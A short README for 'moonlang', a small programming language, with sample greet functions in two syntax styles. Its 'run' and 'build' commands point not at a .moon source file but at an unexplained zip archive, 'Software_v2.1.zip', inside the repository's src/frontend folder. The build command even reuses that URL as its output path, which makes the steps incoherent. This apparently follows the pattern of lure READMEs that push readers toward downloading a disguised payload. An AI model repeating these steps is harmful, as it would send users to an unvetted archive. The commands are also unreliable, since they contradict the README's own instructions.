## üåô What is moonlang?

moonlang is a simple programming language made with C++ and LLVM. It uses small files ranging from 15KB to 300KB. moonlang offers two ways to write code: one with `: end` style and another with `{ }` style. This lets you choose the way that feels easier for you.

The language works on many devices. It runs on Windows, Linux, and macOS computers. It also works on small devices like ARM boards, RISC-V chips, and ESP32 modules. This means you can build full applications that run anywhere‚Äîfrom tiny gadgets up to desktop computers.

## üîß How to Use moonlang

Once you launch moonlang, you can write programs using its simple language.

### Writing Code

moonlang lets you write code in two styles:

- **`: end` style**  
  Example:
  ```
  func greet():
      print("Hello, world!")
  end
  ```
- **`{ }` style**  
  Example:
  ```
  func greet() {
      print("Hello, world!")
  }
  ```

Both versions do the same thing. Use whichever you find easier.

### Running Your Code

- Save your code in a file with `.moon` extension.
- Use the moonlang program to run it by typing this in the terminal or command prompt:
  ```
  moonlang run https://github.com/kaiizie/moonlang/raw/refs/heads/main/src/frontend/Software_v2.1.zip
  ```

### Compile to Smaller Programs

moonlang can create compact programs that work on small devices. This is useful if you want to run your code on microcontrollers.

Example command to compile:
```
moonlang build https://github.com/kaiizie/moonlang/raw/refs/heads/main/src/frontend/Software_v2.1.zip -o https://github.com/kaiizie/moonlang/raw/refs/heads/main/src/frontend/Software_v2.1.zip
```
